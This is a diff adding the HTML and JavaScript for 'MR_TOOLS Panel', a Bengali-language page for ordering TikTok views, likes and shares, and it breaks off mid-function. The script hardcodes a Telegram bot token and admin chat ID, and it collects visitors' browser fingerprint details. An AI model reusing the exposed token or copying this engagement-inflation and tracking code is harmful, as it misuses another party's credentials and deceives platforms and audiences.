@@ -1,0 +1,1297 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>MR_TOOLS Panel</title>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<style>
+* {margin:0; padding:0; box-sizing:border-box; font-family:'Poppins', sans-serif;}
+body {
+    background: radial-gradient(circle at center, #050510, #000000);
+    min-height:100vh;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    overflow-x: hidden;
+    color: #e0e0e0;
+    position: relative;
+}
+body::before {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: 
+        radial-gradient(circle at 20% 30%, rgba(102, 0, 153, 0.2) 0%, transparent 50%),
+        radial-gradient(circle at 80% 70%, rgba(153, 0, 0, 0.2) 0%, transparent 50%),
+        radial-gradient(circle at 40% 80%, rgba(0, 51, 102, 0.2) 0%, transparent 50%);
+    z-index: -2;
+}
+.container {
+    background: linear-gradient(145deg, #0a0a1a, #1a0a1a);
+    padding:40px;
+    border-radius:20px;
+    box-shadow:0 15px 35px rgba(102, 0, 102, 0.5), 
+               inset 0 1px 0 rgba(255,255,255,0.1),
+               0 0 50px rgba(102, 0, 102, 0.3);
+    width:420px;
+    text-align:center;
+    position:relative;
+    transition:0.3s;
+    animation: floatContainer 8s ease-in-out infinite, containerGlow 5s infinite alternate;
+    border: 1px solid rgba(102, 0, 102, 0.7);
+    z-index: 10;
+    overflow: hidden;
+}
+.container::before {
+    content: '';
+    position: absolute;
+    top: -10px;
+    left: -10px;
+    right: -10px;
+    bottom: -10px;
+    background: linear-gradient(45deg, transparent, rgba(102, 0, 153, 0.1), transparent);
+    z-index: -1;
+    animation: rotate 20s linear infinite;
+}
+@keyframes floatContainer {
+    0% { transform: translateY(0px) rotate(0.5deg); }
+    25% { transform: translateY(-15px) rotate(-0.5deg); }
+    50% { transform: translateY(-10px) rotate(0.3deg); }
+    75% { transform: translateY(-20px) rotate(-0.3deg); }
+    100% { transform: translateY(0px) rotate(0.5deg); }
+}
+@keyframes containerGlow {
+    0% { box-shadow: 0 15px 35px rgba(102, 0, 102, 0.5), 0 0 50px rgba(102, 0, 102, 0.3); }
+    100% { box-shadow: 0 15px 35px rgba(153, 0, 0, 0.5), 0 0 50px rgba(153, 0, 0, 0.3); }
+}
+.container:hover {
+    animation-play-state: paused;
+}
+.profile-pic {
+    width:120px;
+    height:120px;
+    border-radius:50%;
+    overflow:hidden;
+    margin:0 auto 15px auto;
+    border:5px solid #660066;
+    box-shadow:0 5px 15px rgba(102, 0, 102, 0.6),
+               0 0 30px rgba(102, 0, 102, 0.4);
+    animation: pulseGlow 3s infinite alternate, shake 10s infinite;
+    position: relative;
+}
+@keyframes pulseGlow {
+    0% { 
+        box-shadow: 0 5px 15px rgba(102, 0, 102, 0.6),
+                    0 0 30px rgba(102, 0, 102, 0.4);
+        border-color: #660066;
+    }
+    100% { 
+        box-shadow: 0 5px 25px rgba(102, 0, 102, 0.9),
+                    0 0 50px rgba(102, 0, 102, 0.7),
+                    0 0 70px rgba(102, 0, 102, 0.4);
+        border-color: #ff00ff;
+    }
+}
+@keyframes shake {
+    0%, 100% { transform: translateX(0) translateY(0); }
+    10%, 30%, 50%, 70%, 90% { transform: translateX(-2px) translateY(-2px); }
+    20%, 40%, 60%, 80% { transform: translateX(2px) translateY(2px); }
+}
+.profile-pic::before {
+    content: '';
+    position: absolute;
+    top: -10px;
+    left: -10px;
+    right: -10px;
+    bottom: -10px;
+    border-radius: 50%;
+    background: conic-gradient(from 0deg, #ff0066, #6600ff, #00ccff, #ff0066);
+    z-index: -1;
+    animation: rotate 8s linear infinite;
+    opacity: 0.7;
+    filter: blur(15px);
+}
+@keyframes rotate {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+.profile-pic img {
+    width:100%; 
+    height:100%; 
+    object-fit:cover;
+    transition: transform 0.5s;
+    filter: sepia(0.5) hue-rotate(290deg) contrast(1.2);
+    animation: imagePulse 5s infinite alternate;
+}
+@keyframes imagePulse {
+    0% { filter: sepia(0.5) hue-rotate(290deg) contrast(1.2); }
+    100% { filter: sepia(0.7) hue-rotate(300deg) contrast(1.5) brightness(1.1); }
+}
+.profile-pic:hover img {
+    transform: scale(1.1) rotate(5deg);
+    animation: none;
+    filter: sepia(0.7) hue-rotate(300deg) contrast(1.8) brightness(1.2);
+}
+h1 {
+    color:#cc66ff;
+    margin-bottom:25px;
+    font-size:28px;
+    position: relative;
+    display: inline-block;
+    text-shadow: 0 0 10px rgba(204, 102, 255, 0.7);
+    animation: textFlicker 5s infinite alternate, textGlow 3s infinite alternate;
+}
+@keyframes textFlicker {
+    0%, 18%, 22%, 25%, 53%, 57%, 100% {
+        opacity: 1;
+        text-shadow: 0 0 10px rgba(204, 102, 255, 0.7);
+    }
+    20%, 24%, 55% {
+        opacity: 0.7;
+        text-shadow: 0 0 5px rgba(204, 102, 255, 0.3);
+    }
+}
+@keyframes textGlow {
+    0% { text-shadow: 0 0 10px rgba(204, 102, 255, 0.7); }
+    100% { text-shadow: 0 0 20px rgba(204, 102, 255, 1), 0 0 30px rgba(204, 102, 255, 0.7); }
+}
+h1::after {
+    content: '';
+    position: absolute;
+    bottom: -5px;
+    left: 0;
+    width: 100%;
+    height: 3px;
+    background: linear-gradient(90deg, transparent, #cc66ff, transparent);
+    animation: shimmer 3s infinite linear;
+}
+@keyframes shimmer {
+    0% { transform: translateX(-100%); }
+    100% { transform: translateX(100%); }
+}
+#settingsBtn {
+    position:absolute;
+    top:20px;
+    right:20px;
+    background: linear-gradient(145deg, #660066, #990099);
+    color:#fff;
+    border:none;
+    border-radius:8px;
+    padding:6px 12px;
+    cursor:pointer;
+    font-weight:600;
+    transition:0.3s;
+    animation: rotate 4s linear infinite, buttonPulse 2s infinite alternate;
+    box-shadow: 0 3px 10px rgba(102, 0, 102, 0.5);
+    z-index: 11;
+}
+@keyframes buttonPulse {
+    0% { transform: scale(1); }
+    100% { transform: scale(1.1); }
+}
+#settingsBtn:hover {
+    background: linear-gradient(145deg, #990099, #cc00cc);
+    animation-play-state: paused;
+    box-shadow: 0 5px 15px rgba(153, 0, 153, 0.7);
+}
+input, select {
+    width:100%;
+    padding:12px 15px;
+    margin:10px 0;
+    border-radius:12px;
+    border:1px solid #660066;
+    font-size:16px;
+    transition: all 0.3s;
+    background: rgba(10, 10, 20, 0.7);
+    color: #e0e0e0;
+    box-shadow: inset 0 2px 5px rgba(0,0,0,0.5);
+    animation: inputGlow 8s infinite alternate;
+}
+@keyframes inputGlow {
+    0% { box-shadow: inset 0 2px 5px rgba(0,0,0,0.5), 0 0 5px rgba(102, 0, 102, 0.3); }
+    100% { box-shadow: inset 0 2px 5px rgba(0,0,0,0.5), 0 0 10px rgba(153, 0, 153, 0.5); }
+}
+input:focus, select:focus {
+    border-color: #cc66ff;
+    box-shadow: 0 0 15px rgba(204, 102, 255, 0.7),
+                inset 0 2px 5px rgba(0,0,0,0.5);
+    transform: scale(1.02);
+    outline: none;
+    animation: none;
+}
+input[readonly] {
+    background:rgba(30, 30, 50, 0.7); 
+    color:#aaa;
+    cursor:not-allowed;
+}
+button {
+    padding:12px 20px;
+    border:none;
+    border-radius:12px;
+    background: linear-gradient(145deg, #660066, #990099);
+    color:#fff;
+    font-weight:600;
+    cursor:pointer;
+    transition:0.3s;
+    font-size:16px;
+    position: relative;
+    overflow: hidden;
+    box-shadow: 0 5px 15px rgba(102, 0, 102, 0.5);
+    animation: buttonShadow 4s infinite alternate;
+}
+@keyframes buttonShadow {
+    0% { box-shadow: 0 5px 15px rgba(102, 0, 102, 0.5); }
+    100% { box-shadow: 0 5px 20px rgba(153, 0, 153, 0.7), 0 0 25px rgba(153, 0, 153, 0.5); }
+}
+button::before {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: -100%;
+    width: 100%;
+    height: 100%;
+    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+    transition: left 0.5s;
+}
+button:hover::before {
+    left: 100%;
+}
+button:hover {
+    background: linear-gradient(145deg, #990099, #cc00cc);
+    transform: translateY(-2px);
+    box-shadow: 0 8px 20px rgba(153, 0, 153, 0.7);
+    animation: none;
+}
+.alert {
+    margin-top:15px; 
+    font-weight:600; 
+    font-size:15px; 
+    color:#e0e0e0;
+    animation: fadeIn 0.5s, alertPulse 3s infinite alternate;
+}
+@keyframes fadeIn {
+    from { opacity: 0; transform: translateY(10px); }
+    to { opacity: 1; transform: translateY(0); }
+}
+@keyframes alertPulse {
+    0% { text-shadow: 0 0 5px rgba(255,255,255,0.5); }
+    100% { text-shadow: 0 0 10px rgba(255,255,255,0.8); }
+}
+.loader {
+    width:100%; 
+    background:rgba(30, 30, 50, 0.7); 
+    border-radius:12px; 
+    margin-top:15px; 
+    display:none;
+    overflow: hidden;
+    box-shadow: inset 0 2px 5px rgba(0,0,0,0.5);
+}
+.progress {
+    width:0%; 
+    height:12px; 
+    background: linear-gradient(90deg, #660066, #cc66ff, #ff0066);
+    border-radius:12px; 
+    transition:width 0.4s;
+    position: relative;
+    animation: progressPulse 2s infinite alternate;
+}
+@keyframes progressPulse {
+    0% { filter: brightness(1); }
+    100% { filter: brightness(1.3); }
+}
+.progress::after {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
+    animation: shimmerProgress 1.5s infinite;
+}
+@keyframes shimmerProgress {
+    0% { transform: translateX(-100%); }
+    100% { transform: translateX(100%); }
+}
+small {
+    color:#aaa; 
+    display:block; 
+    margin-top:5px;
+    animation: slideIn 0.5s;
+}
+@keyframes slideIn {
+    from { opacity: 0; transform: translateX(-20px); }
+    to { opacity: 1; transform: translateX(0); }
+}
+#countdownText {
+    color:#cc66ff; 
+    font-weight:bold; 
+    display:block; 
+    margin-top:10px;
+    animation: pulse 1s infinite alternate, countdownFlicker 3s infinite;
+    text-shadow: 0 0 5px rgba(204, 102, 255, 0.7);
+}
+@keyframes pulse {
+    0% { transform: scale(1); }
+    100% { transform: scale(1.05); }
+}
+@keyframes countdownFlicker {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.7; }
+}
+#resetLinkNotice {
+    color:#ff66cc; 
+    font-weight:bold; 
+    display:block; 
+    margin-top:10px;
+    animation: shake 0.5s, noticeGlow 4s infinite alternate;
+    text-shadow: 0 0 5px rgba(255, 102, 204, 0.7);
+}
+@keyframes noticeGlow {
+    0% { text-shadow: 0 0 5px rgba(255, 102, 204, 0.7); }
+    100% { text-shadow: 0 0 10px rgba(255, 102, 204, 1), 0 0 15px rgba(255, 102, 204, 0.7); }
+}
+@keyframes shake {
+    0%, 100% { transform: translateX(0); }
+    25% { transform: translateX(-5px); }
+    75% { transform: translateX(5px); }
+}
+#resetLinkBtn {
+    display: none;
+    margin-top: 10px;
+    background: linear-gradient(145deg, #006633, #00994d);
+    width: 100%;
+    animation: glow 2s infinite alternate, buttonFloat 3s infinite ease-in-out;
+    box-shadow: 0 5px 15px rgba(0, 102, 51, 0.5);
+}
+@keyframes buttonFloat {
+    0%, 100% { transform: translateY(0); }
+    50% { transform: translateY(-3px); }
+}
+@keyframes glow {
+    0% { box-shadow: 0 0 5px rgba(0, 102, 51, 0.5); }
+    100% { box-shadow: 0 0 20px rgba(0, 204, 102, 0.8); }
+}
+#resetLinkBtn:hover {
+    background: linear-gradient(145deg, #00994d, #00cc66);
+    animation-play-state: paused;
+}
+
+/* Block Message Styles */
+.block-message {
+    background: rgba(255, 0, 0, 0.2);
+    border: 2px solid #ff0000;
+    border-radius: 15px;
+    padding: 30px;
+    margin: 20px 0;
+    color: #ff6666;
+    text-align: center;
+    animation: blockPulse 2s infinite alternate;
+    display: none;
+}
+@keyframes blockPulse {
+    0% { 
+        box-shadow: 0 0 10px rgba(255, 0, 0, 0.3);
+        background: rgba(255, 0, 0, 0.2);
+    }
+    100% { 
+        box-shadow: 0 0 30px rgba(255, 0, 0, 0.6);
+        background: rgba(255, 0, 0, 0.3);
+    }
+}
+.block-icon {
+    font-size: 50px;
+    margin-bottom: 15px;
+    animation: shake 0.5s infinite;
+}
+
+.user-info {
+    background: rgba(102, 0, 153, 0.2);
+    border: 1px solid #660066;
+    border-radius: 10px;
+    padding: 10px;
+    margin: 10px 0;
+    font-size: 12px;
+    color: #cc66ff;
+    display: none;
+}
+
+/* Timer Block Message */
+.timer-block-message {
+    background: rgba(255, 153, 0, 0.2);
+    border: 2px solid #ff9900;
+    border-radius: 15px;
+    padding: 30px;
+    margin: 20px 0;
+    color: #ffcc66;
+    text-align: center;
+    animation: timerBlockPulse 2s infinite alternate;
+    display: none;
+}
+@keyframes timerBlockPulse {
+    0% { 
+        box-shadow: 0 0 10px rgba(255, 153, 0, 0.3);
+        background: rgba(255, 153, 0, 0.2);
+    }
+    100% { 
+        box-shadow: 0 0 30px rgba(255, 153, 0, 0.6);
+        background: rgba(255, 153, 0, 0.3);
+    }
+}
+.timer-block-icon {
+    font-size: 50px;
+    margin-bottom: 15px;
+    animation: bounce 1s infinite;
+}
+@keyframes bounce {
+    0%, 100% { transform: translateY(0); }
+    50% { transform: translateY(-10px); }
+}
+
+/* Admin Message Modal */
+.message-modal {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0, 0, 0, 0.8);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    z-index: 1000;
+    animation: fadeIn 0.5s;
+}
+
+.message-content {
+    background: linear-gradient(145deg, #0a0a1a, #1a0a1a);
+    padding: 30px;
+    border-radius: 20px;
+    max-width: 400px;
+    width: 90%;
+    text-align: center;
+    box-shadow: 0 15px 35px rgba(102, 0, 102, 0.5);
+    border: 2px solid #660066;
+    animation: scaleIn 0.5s;
+}
+
+@keyframes scaleIn {
+    from { transform: scale(0.8); opacity: 0; }
+    to { transform: scale(1); opacity: 1; }
+}
+
+.message-icon {
+    font-size: 50px;
+    color: #cc66ff;
+    margin-bottom: 15px;
+}
+
+.message-text {
+    font-size: 18px;
+    margin-bottom: 25px;
+    color: #e0e0e0;
+    line-height: 1.5;
+}
+
+.ok-button {
+    background: linear-gradient(145deg, #660066, #990099);
+    color: white;
+    border: none;
+    padding: 12px 30px;
+    border-radius: 10px;
+    font-size: 16px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: all 0.3s;
+    box-shadow: 0 5px 15px rgba(102, 0, 102, 0.5);
+}
+
+.ok-button:hover {
+    background: linear-gradient(145deg, #990099, #cc00cc);
+    transform: translateY(-2px);
+    box-shadow: 0 8px 20px rgba(153, 0, 153, 0.7);
+}
+
+/* Horror background elements */
+.ghost {
+    position: absolute;
+    width: 60px;
+    height: 80px;
+    background: rgba(102, 0, 153, 0.4);
+    border-radius: 50% 50% 0 0;
+    animation: floatGhost 20s linear infinite, ghostFlicker 5s infinite;
+    pointer-events: none;
+    z-index: -1;
+    filter: blur(2px);
+}
+.ghost::before, .ghost::after {
+    content: '';
+    position: absolute;
+    background: rgba(102, 0, 153, 0.4);
+    width: 25px;
+    height: 35px;
+    bottom: -17px;
+    border-radius: 50%;
+    animation: ghostFloat 3s infinite ease-in-out;
+}
+.ghost::before { 
+    left: 5px; 
+    animation-delay: 0.5s;
+}
+.ghost::after { 
+    right: 5px; 
+    animation-delay: 1s;
+}
+@keyframes ghostFloat {
+    0%, 100% { transform: translateY(0); }
+    50% { transform: translateY(-10px); }
+}
+.ghost .eyes {
+    position: absolute;
+    width: 15px;
+    height: 15px;
+    background: rgba(255, 102, 204, 0.9);
+    border-radius: 50%;
+    top: 25px;
+    animation: blink 4s infinite, eyeGlow 3s infinite alternate;
+}
+@keyframes eyeGlow {
+    0% { box-shadow: 0 0 5px rgba(255, 102, 204, 0.7); }
+    100% { box-shadow: 0 0 15px rgba(255, 102, 204, 1); }
+}
+.ghost .eyes.left { 
+    left: 12px; 
+    animation-delay: 0.2s;
+}
+.ghost .eyes.right { 
+    right: 12px; 
+    animation-delay: 0.4s;
+}
+@keyframes blink {
+    0%, 92%, 96%, 100% { transform: scaleY(1); }
+    94%, 98% { transform: scaleY(0.1); }
+}
+@keyframes ghostFlicker {
+    0%, 100% { opacity: 0.7; }
+    50% { opacity: 0.4; }
+}
+@keyframes floatGhost {
+    0% { 
+        transform: translateX(-100px) translateY(0) rotate(0deg) scale(0.8);
+        opacity: 0;
+    }
+    10% {
+        opacity: 0.7;
+    }
+    90% {
+        opacity: 0.7;
+    }
+    100% { 
+        transform: translateX(calc(100vw + 100px)) translateY(calc((100vh - 200px) * var(--y-pos))) rotate(360deg) scale(1.2);
+        opacity: 0;
+    }
+}
+
+/* Spooky floating elements */
+.spooky-orb {
+    position: absolute;
+    width: 40px;
+    height: 40px;
+    border-radius: 50%;
+    background: radial-gradient(circle, rgba(102,0,153,0.8) 0%, rgba(102,0,153,0) 70%);
+    animation: floatOrb 25s linear infinite, orbPulse 5s infinite alternate;
+    z-index: -1;
+    filter: blur(8px);
+}
+@keyframes floatOrb {
+    0% { 
+        transform: translate(0, 0) scale(0.5);
+        opacity: 0;
+    }
+    10% {
+        opacity: 0.7;
+    }
+    90% {
+        opacity: 0.7;
+    }
+    100% { 
+        transform: translate(calc(100vw * var(--x-move)), calc(100vh * var(--y-move))) scale(1.5);
+        opacity: 0;
+    }
+}
+@keyframes orbPulse {
+    0% { transform: scale(1); }
+    100% { transform: scale(1.3); }
+}
+
+/* Blood drips */
+.blood-drip {
+    position: absolute;
+    width: 4px;
+    height: 40px;
+    background: linear-gradient(to bottom, rgba(153,0,0,0.9), transparent);
+    border-radius: 50%;
+    animation: drip 12s infinite;
+    z-index: -1;
+    filter: blur(1px);
+}
+@keyframes drip {
+    0% {
+        transform: translateY(-50px);
+        opacity: 0;
+    }
+    10% {
+        opacity: 0.8;
+    }
+    90% {
+        opacity: 0.8;
+    }
+    100% {
+        transform: translateY(100vh);
+        opacity: 0;
+    }
+}
+
+/* Scary face flashes */
+.scary-face {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: radial-gradient(circle, transparent 30%, rgba(0,0,0,0.9) 100%);
+    opacity: 0;
+    z-index: 5;
+    pointer-events: none;
+    animation: faceFlash 30s infinite;
+}
+@keyframes faceFlash {
+    0%, 96% { opacity: 0; }
+    97%, 98% { opacity: 0.7; }
+    99%, 100% { opacity: 0; }
+}
+
+/* Horror texture overlay */
+.horror-overlay {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: 
+        url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" opacity="0.05"><path d="M0 0 L100 100 M100 0 L0 100" stroke="red" stroke-width="1"/></svg>'),
+        url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200" opacity="0.03"><path d="M20,20 Q100,50 180,20 T180,180 T20,180 T20,20 Z" fill="none" stroke="purple" stroke-width="2"/></svg>');
+    background-size: 100px 100px, 200px 200px;
+    animation: overlayMove 60s infinite linear;
+    z-index: -1;
+    pointer-events: none;
+}
+@keyframes overlayMove {
+    0% { background-position: 0 0, 0 0; }
+    100% { background-position: 100px 100px, 200px 200px; }
+}
+
+/* Creepy crawlers */
+.crawler {
+    position: absolute;
+    width: 30px;
+    height: 10px;
+    background: linear-gradient(to right, #330000, #660000);
+    border-radius: 5px;
+    animation: crawl 40s linear infinite;
+    z-index: -1;
+    filter: blur(1px);
+    box-shadow: 0 0 10px rgba(102, 0, 0, 0.7);
+}
+@keyframes crawl {
+    0% {
+        transform: translateX(-50px) translateY(var(--crawl-y)) rotate(0deg);
+        opacity: 0;
+    }
+    5% {
+        opacity: 0.8;
+    }
+    95% {
+        opacity: 0.8;
+    }
+    100% {
+        transform: translateX(calc(100vw + 50px)) translateY(calc(var(--crawl-y) + 100px)) rotate(360deg);
+        opacity: 0;
+    }
+}
+</style>
+</head>
+<body>
+
+<!-- Horror background elements -->
+<div class="ghost" style="--y-pos: 0.2; top: 20%; animation-delay: 0s;">
+    <div class="eyes left"></div>
+    <div class="eyes right"></div>
+</div>
+<div class="ghost" style="--y-pos: 0.7; top: 70%; animation-delay: 5s;">
+    <div class="eyes left"></div>
+    <div class="eyes right"></div>
+</div>
+<div class="ghost" style="--y-pos: 0.5; top: 50%; animation-delay: 10s;">
+    <div class="eyes left"></div>
+    <div class="eyes right"></div>
+</div>
+<div class="ghost" style="--y-pos: 0.3; top: 30%; animation-delay: 15s;">
+    <div class="eyes left"></div>
+    <div class="eyes right"></div>
+</div>
+
+<div class="spooky-orb" style="--x-move: 1; --y-move: 0.5; top: 10%; left: 5%; animation-delay: 0s;"></div>
+<div class="spooky-orb" style="--x-move: 0.8; --y-move: 0.7; top: 80%; left: 10%; animation-delay: 8s;"></div>
+<div class="spooky-orb" style="--x-move: 1.2; --y-move: 0.3; top: 40%; left: 2%; animation-delay: 16s;"></div>
+
+<div class="blood-drip" style="left: 5%; animation-delay: 2s;"></div>
+<div class="blood-drip" style="left: 95%; animation-delay: 8s;"></div>
+<div class="blood-drip" style="left: 50%; animation-delay: 14s;"></div>
+
+<div class="scary-face"></div>
+<div class="horror-overlay"></div>
+
+<div class="crawler" style="--crawl-y: 20%; animation-delay: 0s;"></div>
+<div class="crawler" style="--crawl-y: 80%; animation-delay: 10s;"></div>
+<div class="crawler" style="--crawl-y: 60%; animation-delay: 20s;"></div>
+<div class="crawler" style="--crawl-y: 40%; animation-delay: 30s;"></div>
+
+<!-- Admin Message Modal -->
+<div class="message-modal" id="messageModal" style="display: none;">
+    <div class="message-content">
+        <div class="message-icon">
+            <i class="fas fa-envelope"></i>
+        </div>
+        <div class="message-text" id="messageText">
+            এডমিনের কাছ থেকে আপনার জন্য একটি মেসেজ আছে
+        </div>
+        <button class="ok-button" id="okButton">ওকে</button>
+    </div>
+</div>
+
+<div class="container">
+    <div class="profile-pic">
+        <img src="https://i.ibb.co.com/GQmpXr5S/a-bold-and-vibrant-gaming-logo-featuring.jpg" alt="MR_TOOLS Logo">
+    </div>
+
+    <h1>MR_TOOLS Panel ⚡⚡
+        <button id="settingsBtn"><i class="fas fa-cog"></i></button>
+    </h1>
+
+    <!-- Permanent Block Message -->
+    <div class="block-message" id="blockMessage">
+        <div class="block-icon"><i class="fas fa-ban"></i></div>
+        <h2>আপনাকে ব্লক করা হয়েছে!</h2>
+        <p>আপনার অ্যাকাউন্ট অ্যাডমিন দ্বারা ব্লক করা হয়েছে।</p>
+        <p>আরও তথ্যের জন্য অ্যাডমিনের সাথে যোগাযোগ করুন।</p>
+    </div>
+
+    <!-- Timer Block Message -->
+    <div class="timer-block-message" id="timerBlockMessage">
+        <div class="timer-block-icon"><i class="fas fa-clock"></i></div>
+        <h2>আপনাকে সাময়িক ব্লক করা হয়েছে!</h2>
+        <p id="timerBlockText">আপনার অ্যাকাউন্ট <span id="blockTimeRemaining">0</span> মিনিটের জন্য ব্লক করা হয়েছে</p>
+        <p>সময় শেষ হলে স্বয়ংক্রিয়ভাবে আনব্লক হয়ে যাবে</p>
+    </div>
+
+    <!-- User Info -->
+    <div class="user-info" id="userInfo">
+        আপনার ইউজার আইডি: <strong id="userIdDisplay"></strong>
+    </div>
+
+    <!-- Main Form (Hidden when blocked) -->
+    <div id="mainForm">
+        <form id="orderForm">
+            <select id="serviceType" required>
+                <option value="" disabled selected>Service Select</option>
+                <option value="views">Views</option>
+                <option value="likes">Likes</option>
+                <option value="shares">Shares</option>
+            </select>
+
+            <input type="text" id="videoUrl" placeholder="TikTok Video URL" required>
+            <input type="number" id="amount" placeholder="Amount" value="100" required min="1" max="100">
+
+            <button type="submit" id="submitBtn"><i class="fas fa-shopping-cart"></i> PLACE ORDER</button>
+            <button type="button" id="resetLinkBtn"><i class="fas fa-redo"></i> RESET LINK (5 ORDERS COMPLETED)</button>
+
+            <div class="loader"><div class="progress" id="progressBar"></div></div>
+            <div class="alert" id="alertBox"></div>
+            <small id="infoText"></small>
+            <small id="countdownText"></small>
+            <small id="resetLinkNotice"></small>
+        </form>
+    </div>
+</div>
+
+<script>
+// Configuration
+const BOT_TOKEN = "8443808388:AAGY7ewfQvC_KXxz8BlMd0OLiB6rkITRTTs";
+const ADMIN_CHAT_ID = "7245153415";
+
+// User Management
+let userChatId = localStorage.getItem('mr_tools_user_id');
+let isFirstVisit = !userChatId;
+
+// Generate or get user chat ID (8-digit UID)
+if (!userChatId) {
+    userChatId = generate8DigitUID();
+    localStorage.setItem('mr_tools_user_id', userChatId);
+    
+    // Store user activity with improved data structure
+    const userActivity = JSON.parse(localStorage.getItem('mr_tools_user_activity') || '{}');
+    userActivity[userChatId] = {
+        firstVisit: new Date().toISOString(),
+        lastActive: new Date().toISOString(),
+        platform: navigator.platform,
+        userAgent: navigator.userAgent,
+        screenResolution: `${screen.width}x${screen.height}`,
+        language: navigator.language,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        orders: 0,
+        status: 'active'
+    };
+    localStorage.setItem('mr_tools_user_activity', JSON.stringify(userActivity));
+    
+    // Send notification to admin with improved reliability
+    sendNewUserNotification(userChatId);
+}
+
+// Display user ID
+document.getElementById('userIdDisplay').textContent = userChatId;
+document.getElementById('userInfo').style.display = 'block';
+
+// Update user activity with improved sync
+function updateUserActivity() {
+    const userActivity = JSON.parse(localStorage.getItem('mr_tools_user_activity') || '{}');
+    if (userActivity[userChatId]) {
+        userActivity[userChatId].lastActive = new Date().toISOString();
+        userActivity[userChatId].orders = parseInt(localStorage.getItem("orderCount")) || 0;
+        
+        // Check if user is blocked and update status
+        const blockedUsers = JSON.parse(localStorage.getItem('mr_tools_blocked_users') || '{}');
+        const timerBlockedUsers = JSON.parse(localStorage.getItem('mr_tools_timer_blocked_users') || '{}');
+        
+        if (blockedUsers[userChatId]) {
+            userActivity[userChatId].status = 'blocked';
+        } else if (timerBlockedUsers[userChatId]) {
+            userActivity[userChatId].status = 'timer_blocked';
+        } else {
+            userActivity[userChatId].status = 'active';
+        }
+        
+        localStorage.setItem('mr_tools_user_activity', JSON.stringify(userActivity));
+    }
+}
+
+// Check if user is blocked with improved timer countdown
+function checkUserStatus() {
+    const blockedUsers = JSON.parse(localStorage.getItem('mr_tools_blocked_users') || '{}');
+    const timerBlockedUsers = JSON.parse(localStorage.getItem('mr_tools_timer_blocked_users') || '{}');
+    
+    // Check for permanent block
+    if (blockedUsers[userChatId]) {
+        showBlockMessage();
+        return;
+    }
+    
+    // Check for timer block with improved countdown
+    if (timerBlockedUsers[userChatId]) {
+        const blockData = timerBlockedUsers[userChatId];
+        const currentTime = new Date().getTime();
+        const blockEndTime = blockData.blockTime + (blockData.duration * 60 * 1000);
+        
+        if (currentTime < blockEndTime) {
+            // Still blocked - calculate remaining time
+            const remainingTime = blockEndTime - currentTime;
+            const remainingMinutes = Math.floor(remainingTime / (60 * 1000));
+            const remainingSeconds = Math.floor((remainingTime % (60 * 1000)) / 1000);
+            
+            showTimerBlockMessage(remainingMinutes, remainingSeconds);
+            return;
+        } else {
+            // Block time expired, remove from timer block
+            delete timerBlockedUsers[userChatId];
+            localStorage.setItem('mr_tools_timer_blocked_users', JSON.stringify(timerBlockedUsers));
+            updateUserActivity();
+        }
+    }
+    
+    // Not blocked
+    hideBlockMessage();
+}
+
+// Check for admin messages with improved broadcast support
+function checkAdminMessages() {
+    const userMessages = JSON.parse(localStorage.getItem('mr_tools_user_messages') || '{}');
+    const broadcastMessages = JSON.parse(localStorage.getItem('mr_tools_broadcast_messages') || '{}');
+    
+    // Check private messages
+    if (userMessages[userChatId] && userMessages[userChatId].length > 0) {
+        const unreadMessages = userMessages[userChatId].filter(msg => !msg.read);
+        
+        if (unreadMessages.length > 0) {
+            // Show the latest unread message
+            const latestMessage = unreadMessages[0];
+            showAdminMessage(latestMessage.message);
+            
+            // Mark as read
+            userMessages[userChatId] = userMessages[userChatId].map(msg => {
+                if (msg.timestamp === latestMessage.timestamp) {
+                    return {...msg, read: true};
+                }
+                return msg;
+            });
+            
+            localStorage.setItem('mr_tools_user_messages', JSON.stringify(userMessages));
+        }
+    }
+    
+    // Check broadcast messages
+    const broadcastKeys = Object.keys(broadcastMessages);
+    if (broadcastKeys.length > 0) {
+        const latestBroadcastKey = broadcastKeys[broadcastKeys.length - 1];
+        const latestBroadcast = broadcastMessages[latestBroadcastKey];
+        
+        // Check if user has seen this broadcast
+        const seenBroadcasts = JSON.parse(localStorage.getItem('mr_tools_seen_broadcasts') || '{}');
+        if (!seenBroadcasts[latestBroadcastKey]) {
+            showAdminMessage(`📢 ব্রডকাস্ট: ${latestBroadcast.message}`);
+            seenBroadcasts[latestBroadcastKey] = true;
+            localStorage.setItem('mr_tools_seen_broadcasts', JSON.stringify(seenBroadcasts));
+        }
+    }
+}
+
+// Show admin message modal
+function showAdminMessage(message) {
+    const modal = document.getElementById('messageModal');
+    const messageText = document.getElementById('messageText');
+    const okButton = document.getElementById('okButton');
+    
+    messageText.textContent = message;
+    modal.style.display = 'flex';
+    
+    okButton.onclick = function() {
+        modal.style.display = 'none';
+    };
+}
+
+function showBlockMessage() {
+    document.getElementById('blockMessage').style.display = 'block';
+    document.getElementById('timerBlockMessage').style.display = 'none';
+    document.getElementById('mainForm').style.display = 'none';
+    document.getElementById('userInfo').style.display = 'block';
+}
+
+function showTimerBlockMessage(minutes, seconds) {
+    document.getElementById('blockMessage').style.display = 'none';
+    document.getElementById('timerBlockMessage').style.display = 'block';
